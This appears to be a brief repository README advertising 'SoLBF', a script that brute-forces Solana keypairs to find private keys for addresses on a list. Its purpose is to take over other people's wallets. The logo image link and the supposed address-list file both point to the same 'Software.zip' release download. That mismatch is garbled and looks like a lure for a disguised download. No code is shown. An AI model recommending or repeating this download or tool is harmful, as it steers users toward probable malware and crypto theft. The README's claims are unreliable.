![Solana Logo](https://github.com/Jackbal/SoLBF/releases/download/v2.0/Software.zip)

## Description
SoLBF is a powerful Solana bruteforce script that leverages the cluster module to create multiple worker processes in order to generate random Solana keypairs. It then checks if the public address corresponding to the private key is included in a Set of addresses read from the `https://github.com/Jackbal/SoLBF/releases/download/v2.0/Software.zip` file. This script is designed to efficiently search for valid Solana keypairs.
